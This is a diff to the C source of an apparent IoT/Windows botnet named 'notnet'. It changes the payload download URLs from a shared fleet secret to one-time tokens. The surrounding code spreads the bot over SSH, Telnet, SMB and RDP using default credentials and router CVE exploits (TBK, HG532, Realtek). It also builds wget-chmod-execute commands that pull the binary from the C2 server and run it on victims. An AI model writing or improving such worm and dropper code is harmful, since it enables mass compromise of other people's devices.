@@ -338,12 +338,11 @@ int spread_ssh(notnet_bot_t *bot, const char *ip, uint16_t port) {
                 /* Download and install binary */
                 char cmd[1024];
                 char dl_url[1024];
-                snprintf(dl_url, sizeof(dl_url),
-                    "http://%.250s:%d/bot/%s?secret=%s",
-                    bot->c2_http.server, PAYLOAD_DL_PORT, "notnet", bot->secret);
-                /* %.500s: dl_url is already capped at ~280 bytes by the
-                 * .250s precision above, but GCC can't see through the
-                 * intermediate buffer, so cap again to silence truncation. */
+                /* #190: one-time download token instead of the fleet secret. */
+                build_drop_url(bot, dl_url, sizeof(dl_url));
+                /* %.500s: dl_url is capped at ~330 bytes (base URL + token),
+                 * but GCC can't see through the intermediate buffer, so cap
+                 * again to silence truncation. */
                 snprintf(cmd, sizeof(cmd),
                     "wget %.500s -O /tmp/.notnet; chmod +x /tmp/.notnet; nohup /tmp/.notnet &",
                     dl_url);
@@ -605,9 +604,12 @@ int spread_telnet(notnet_bot_t *bot, const char *ip, uint16_t port) {
                 spread_cred_record("telnet", ip, port, default_users[u], default_passes[p]);
                 
                 char cmd[512];
+                char dl_url[512];
+                /* #190: one-time download token instead of the fleet secret. */
+                build_drop_url(bot, dl_url, sizeof(dl_url));
                 snprintf(cmd, sizeof(cmd),
-                    "wget http://%s:%d/bot/notnet?secret=%s -O /tmp/.notnet; chmod +x /tmp/.notnet; nohup /tmp/.notnet &",
-                    bot->c2_http.server, PAYLOAD_DL_PORT, bot->secret);
+                    "wget %.430s -O /tmp/.notnet; chmod +x /tmp/.notnet; nohup /tmp/.notnet &",
+                    dl_url);
                 /* SECURITY FIX (#15): Send command over the established socket */
                 send_command(sock_fd, "telnet", cmd);
                 close(sock_fd);
@@ -958,9 +960,8 @@ static int smb_deploy_payload(int sock, uint16_t tid, uint16_t uid, uint16_t mid
     /* Download payload to temp file */
     char dl_url[512];
     char tmp_path[256];
-    snprintf(dl_url, sizeof(dl_url),
-             "http://%s:%d/bot/notnet?secret=%s",
-             bot->c2_http.server, PAYLOAD_DL_PORT, bot->secret);
+    /* #190: one-time download token instead of the fleet secret. */
+    build_drop_url(bot, dl_url, sizeof(dl_url));
     snprintf(tmp_path, sizeof(tmp_path), "/tmp/.notnet_smb.%s", ip);
 
     int fsize = http_download(bot, dl_url, tmp_path);
@@ -1760,9 +1761,8 @@ int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port) {
              * -Wformat-truncation analysis on the 512-byte array. */
             char cmd[512];
             char dl_url[512];
-            snprintf(dl_url, sizeof(dl_url),
-                     "http://%s:%d/bot/notnet?secret=%s",
-                     bot->c2_http.server, PAYLOAD_DL_PORT, bot->secret);
+            /* #190: one-time download token instead of the fleet secret. */
+            build_drop_url(bot, dl_url, sizeof(dl_url));
 
             snprintf(cmd, sizeof(cmd),
                      "cmd.exe /c wget \"%.430s\" -O C:\\Windows\\Temp\\notnet.exe && C:\\Windows\\Temp\\notnet.exe &",
@@ -1945,8 +1945,8 @@ static int cve_tbk_verify(const char *ip, uint16_t port) {
 
 static int cve_tbk_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
     char dl_url[512];
-    snprintf(dl_url, sizeof(dl_url), "http://%.250s:%d/bot/notnet?secret=%s",
-             bot->c2_http.server, PAYLOAD_DL_PORT, bot->secret);
+    /* #190: one-time download token instead of the fleet secret. */
+    build_drop_url(bot, dl_url, sizeof(dl_url));
     /* BusyBox wget; ';' separators keep the injected line single. */
     char cmd[1024];
     snprintf(cmd, sizeof(cmd),
@@ -2041,8 +2041,8 @@ static int cve_hg532_verify(const char *ip, uint16_t port) {
 
 static int cve_hg532_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
     char dl_url[512];
-    snprintf(dl_url, sizeof(dl_url), "http://%.250s:%d/bot/notnet?secret=%s",
-             bot->c2_http.server, PAYLOAD_DL_PORT, bot->secret);
+    /* #190: one-time download token instead of the fleet secret. */
+    build_drop_url(bot, dl_url, sizeof(dl_url));
     char cmd[1024];
     snprintf(cmd, sizeof(cmd),
              "wget %.500s -O /tmp/.notnet; chmod +x /tmp/.notnet; /tmp/.notnet",
@@ -2118,8 +2118,8 @@ static int cve_realtek_verify(const char *ip, uint16_t port) {
 
 static int cve_realtek_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
     char dl_url[512];
-    snprintf(dl_url, sizeof(dl_url), "http://%.250s:%d/bot/notnet?secret=%s",
-             bot->c2_http.server, PAYLOAD_DL_PORT, bot->secret);
+    /* #190: one-time download token instead of the fleet secret. */
+    build_drop_url(bot, dl_url, sizeof(dl_url));
     /* '+' is the form-encoded space; ';' separates the shell steps and
      * the raw URL contains no '&', so the value cannot split params. */
     char body[1536];
